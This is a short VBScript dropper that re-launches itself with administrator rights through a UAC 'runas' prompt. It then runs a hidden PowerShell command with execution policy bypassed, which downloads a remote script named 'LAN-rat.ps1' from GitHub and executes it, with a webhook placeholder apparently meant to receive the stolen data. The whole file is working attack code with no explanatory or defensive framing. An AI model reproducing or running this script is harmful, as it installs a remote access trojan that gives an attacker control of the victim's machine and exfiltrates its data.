Set WshShell = WScript.CreateObject("WScript.Shell")
WScript.Sleep 200

If Not WScript.Arguments.Named.Exists("elevate") Then
  CreateObject("Shell.Application").ShellExecute WScript.FullName _
    , """" & WScript.ScriptFullName & """ /elevate", "", "runas", 1
  WScript.Quit
End If

WshShell.Run "powershell.exe -NonI -NoP -Ep Bypass -W H -C $dc='WEBHOOK_HERE'; irm https://raw.githubusercontent.com/beigeworm/assets/main/Scripts/LAN-rat.ps1 | iex", 0, True
